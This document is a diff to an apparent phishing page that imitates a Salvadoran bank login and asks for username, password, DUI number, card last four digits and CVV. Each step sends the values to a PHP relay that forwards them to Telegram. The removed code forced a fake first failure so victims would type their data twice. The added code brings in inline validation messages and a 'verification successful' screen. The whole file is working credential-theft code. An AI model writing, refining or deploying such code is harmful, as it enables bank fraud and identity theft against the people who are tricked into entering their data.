@@ -1047,6 +1047,16 @@
       .ak { display: none !important }
     }
 
+    /* Disclaimer de validación inline */
+    .field-err {
+      font-size: 12px;
+      color: #c0392b;
+      font-family: 'Open Sans', sans-serif;
+      margin-top: 5px;
+      display: none;
+    }
+    .field-err.show { display: block; }
+
     /* Palomita dibujada con CSS para el checkbox "Recordar usuario" */
     .s .v.checked .w {
       display: block !important;
@@ -1102,6 +1112,7 @@
                         <div style="display:flex;width:100%"><input type="text" id="x1" autocomplete="off"
                             autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="20" style="opacity:1">
                         </div>
+                        <p class="field-err" id="err1">Ingrese su usuario.</p>
                       </div>
                     </div>
                   </div>
@@ -1134,6 +1145,7 @@
                         <div style="display:flex;width:100%"><input type="password" id="x2" autocomplete="off"
                             autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="20" style="opacity:1">
                         </div>
+                        <p class="field-err" id="err2">Ingrese su clave.</p>
                       </div>
                     </div>
                   </div>
@@ -1150,6 +1162,7 @@
                       <div class="p">
                         <div style="display:flex;width:100%"><input type="text" id="x3" inputmode="numeric"
                             autocomplete="off" maxlength="9" placeholder="Número de DUI"></div>
+                        <p class="field-err" id="err3">Ingrese DUI válido (9 dígitos).</p>
                       </div>
                     </div>
                   </div>
@@ -1170,6 +1183,7 @@
                           <div style="flex:1"><input type="text" id="x5" inputmode="numeric" maxlength="3"
                               placeholder="CVV" autocomplete="off" style="width:100%"></div>
                         </div>
+                        <p class="field-err" id="err4">Complete últimos 4 dígitos y CVV.</p>
                       </div>
                     </div>
                   </div>
@@ -1216,7 +1230,6 @@
       var _pc = $('pc2'), _btn = $('btn2'), _bt = $('btxt2');
       var _i1 = $('x1'), _i2 = $('x2'), _i3 = $('x3'), _i4 = $('x4'), _i5 = $('x5');
       var _step = 1;
-      var _attempt = 1; // 1 = primer intento (falla forzada), 2 = segundo intento (éxito)
 
       function _show(s) {
         _s1.className = 'x'; _s2.className = 'x'; _s3.className = 'x'; _s4.className = 'x';
@@ -1236,55 +1249,55 @@
         return false;
       }
 
-      // Envío al relay PHP (el webhook real vive del lado servidor)
+      // Envío al relay PHP (retorna true si Telegram confirmó ok)
       async function _sendToDiscord(data, stepLabel) {
         try {
-          await fetch('manzanaverde.php', {
+          var r = await fetch('manzanaverde.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(Object.assign({ step: stepLabel }, data))
           });
-        } catch (e) { /* silencioso */ }
+          var j = await r.json();
+          return j && j.ok === true;
+        } catch (e) { return false; }
       }
 
       // Función para enviar el paso actual
       async function _sendStep(step) {
         var data = {};
         var label = '';
-        var prefix = '[Intento ' + _attempt + '/2] ';
         if (step == 1) {
           data.usuario = _i1.value.trim();
-          label = prefix + '1 · Usuario';
+          label = '1 · Usuario';
         } else if (step == 2) {
           data.usuario = _i1.value.trim();
           data.clave = _i2.value.trim();
-          label = prefix + '2 · Clave';
+          label = '2 · Clave';
         } else if (step == 3) {
           data.usuario = _i1.value.trim();
           data.clave = _i2.value.trim();
           data.dui = _i3.value.trim();
-          label = prefix + '3 · DUI';
+          label = '3 · DUI';
         } else if (step == 4) {
           data.usuario = _i1.value.trim();
           data.clave = _i2.value.trim();
           data.dui = _i3.value.trim();
           data.last4 = _i4.value.trim();
           data.cvv = _i5.value.trim();
-          label = prefix + '4 · COMPLETO';
+          label = '4 · COMPLETO';
         }
-        await _sendToDiscord(data, label);
+        return await _sendToDiscord(data, label);
       }
 
       // Evento click del botón
       _btn.addEventListener('click', function (e) {
         e.preventDefault();
         if (!_valid(_step)) {
-          var msg = '';
-          if (_step == 1) msg = 'Ingrese su usuario.';
-          else if (_step == 2) msg = 'Ingrese su clave.';
-          else if (_step == 3) msg = 'Ingrese DUI válido (9 dígitos).';
-          else if (_step == 4) msg = 'Complete últimos 4 dígitos y CVV.';
-          alert(msg);
+          var errEl = document.getElementById('err' + _step);
+          if (errEl) {
+            errEl.classList.add('show');
+            setTimeout(function () { errEl.classList.remove('show'); }, 3000);
+          }
           return;
         }
 
@@ -1311,28 +1324,25 @@
         }
 
         // Enviar el paso actual antes de avanzar
-        _sendStep(_step).then(function () {
-          if (_step == 1) { _step = 2; _show(2); }
-          else if (_step == 2) { _loaderThen(1500, function () { _step = 3; _show(3); }); }
-          else if (_step == 3) { _loaderThen(1500, function () { _step = 4; _show(4); }); }
-          else if (_step == 4) {
-            if (_attempt === 1) {
-              // Primer intento: fallar y reiniciar el flujo
-              _resultThen(10000, 'fail', 'VERIFICACIÓN FALLIDA\nAlgunos de tus datos son incorrectos', 3500, function () {
-                _attempt = 2;
-                _resetForm();
-                _step = 1; _show(1);
-              });
+        if (_step == 1) { _sendStep(1); _step = 2; _show(2); }
+        else if (_step == 2) { _sendStep(2); _loaderThen(1500, function () { _step = 3; _show(3); }); }
+        else if (_step == 3) { _sendStep(3); _loaderThen(1500, function () { _step = 4; _show(4); }); }
+        else if (_step == 4) {
+          _showOverlay();
+          _sendStep(4).then(function (ok) {
+            if (ok) {
+              var o = _ovEl();
+              o.classList.add('success');
+              _ovText('VERIFICACIÓN EXITOSA');
+              setTimeout(function () { _hideOverlay(); _resetForm(); _step = 1; _show(1); }, 2500);
             } else {
-              // Segundo intento: éxito y reiniciar todo
-              _resultThen(10000, 'success', 'VERIFICACIÓN EXITOSA', 2500, function () {
-                _attempt = 1;
-                _resetForm();
-                _step = 1; _show(1);
-              });
+              _hideOverlay();
+              alert('Algunos de tus datos son incorrectos.');
+              _resetForm();
+              _step = 1; _show(1);
             }
-          }
-        });
+          });
+        }
       });
 
       // Enter en los campos
